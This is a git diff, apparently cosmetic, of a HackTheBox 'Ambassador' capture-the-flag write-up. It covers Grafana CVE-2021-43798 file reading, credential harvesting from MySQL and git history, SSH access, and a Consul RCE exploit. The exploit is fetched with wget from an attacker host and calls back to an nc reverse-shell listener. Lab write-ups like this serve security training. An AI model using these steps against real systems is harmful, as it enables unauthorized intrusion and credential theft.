@@ -1,15 +1,18 @@
 
 Add `ambassador.htb` to `/etc/hosts`
+
 ```bash
 echo "10.10.11.183	ambassador.htb" | sudo tee -a /etc/hosts
 ```
 
 Initial enumeration consisted of firing up `autorcon`
+
 ```bash
 sudo (which autorecon) ambassador.htb
 ```
 - It will not inform you of the desired port `3000` on the initial terminal output. You can go to:
 	- `/results/ambassador.htb/scans/`
+
 ```bash
 cat _full_tcp_nmap.txt | grep open                                                                                                                                                            
 
@@ -24,6 +27,7 @@ cat _full_tcp_nmap.txt | grep open
 - [[http://ambassador.htb:3000/login]]
 - Despite `Grafana` not having any password rate limiters this will not be the route in.
 - Fortunately, the `Grafana` app has some convenient information disclosure of the version at the bottom right.
+
 ```bash
 v8.2.0
 ```
@@ -40,6 +44,7 @@ GoogleFu:
 - This will lead you to this convenient github repository:
 	- [[https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798]]
 - Run:
+
 ```bash
 git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git
 cd exploit-grafana-CVE-2021-43798
@@ -57,12 +62,14 @@ targets.txt
 - After running the exploit you will have a new directory named:
 - `http_ambassador_htb_300` or something similar.
 	- The file structure will look like:
+
 ```bash
 cmdline*  defaults.ini*  grafana.db*  grafana.ini*  passwd*
 ```
 - Note you will be able to verify there is in fact a user named `developer` in the `passwd` or `/etc/passwd` file.
 
 - In `grafana.ini` you can find login credentials to the site. There isn't much to go off of besides some sort of `*.json` upload functionality that doesn't seem to be much of a help.
+
 ```bash
 bat grafana.ini
 
@@ -83,6 +90,7 @@ bat grafana.ini
 ```
 
 - In the `grafana.db` you can find some additional credentials.
+
 ```bash
 sqlite3 grafana.db
 
@@ -119,12 +127,14 @@ sqlite> select * from data_source;
 
 - We can then utilize the `mysql` instance on port `3306`.
 - In order to sign in:
+
 ```bash
 mysql -u grafana --password -h ambassador.htb -P 3306
 Enter password: dontStandSoCloseToMe63221!
 ```
 
 - Show the databases available.
+
 ```bash
 show databases;
 
@@ -141,6 +151,7 @@ show databases;
 ```
 
 - Select a specific database then show the tables that are within said database.
+
 ```bash
 use whackywidget
 show tables;
@@ -153,6 +164,7 @@ show tables;
 ```
 
 - Select all from the `users` table.
+
 ```bash
 select * from users;
 
@@ -164,24 +176,28 @@ select * from users;
 ```
 
 - Decode the `base64` hash which can be identified by the two `==` at the end of the hash.
+
 ```bash
 echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
 anEnglishManInNewYork027468
 ```
 
 - We got a new password! Let's give it a go and `ssh` into the server as `developer` and see if it works.
+
 ```bash
 ssh developer@ambassador.htb  
 Password: anEnglishManInNewYork027468
 ```
 
 - It does! We're in. We can see the user flag which we can grab right away.
+
 ```bash
 cat user.txt 
 7a66916c1c5853a796dc6434ec0fcfdb
 ```
 
 - We can also see `.gitconfig` if we run `ls -lat`
+
 ```bash
 cat .gitconfig
 
@@ -200,6 +216,7 @@ cat .gitconfig
 Let's check it out.
 - We can see some commit messages.
 - We can go into the `/root` directory of `my-app` at `/opt/my-app` and check it out.
+
 ```bash
 git log
 ```
@@ -207,6 +224,7 @@ git log
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20230119225327.png)
 
 - Right off the bat we find some secrets.
+
 ```bash
 git show 33a53ef9a207976d5ceceddc41a199558843bf3c
 
@@ -228,6 +246,7 @@ GoogleFu:
 	- [[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API]]
 - Let's test it out.
 - On Host:
+
 ```bash
 cd ~/Downloads/temp
 wget https://raw.githubusercontent.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/main/exploit.py
@@ -235,21 +254,25 @@ mv exploit.py consul.py
 python -m http.server
 ```
 - On Victim (as developer):
+
 ```bash
 wget http://10.10.16.34:8000/consul.py
 chmod 700 consul.py
 ```
 - On host:
+
 ```bash
 On host:
 nc -lvnp 4444
 ```
 - On Victim (as developer):
+
 ```bash
 python3 consul.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.16.34 --lport 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 ```
 - It informs us to check back on our host machine.
 - Voila! Rooted!
+
 ```bash
 cat /home/developer/user.txt
 
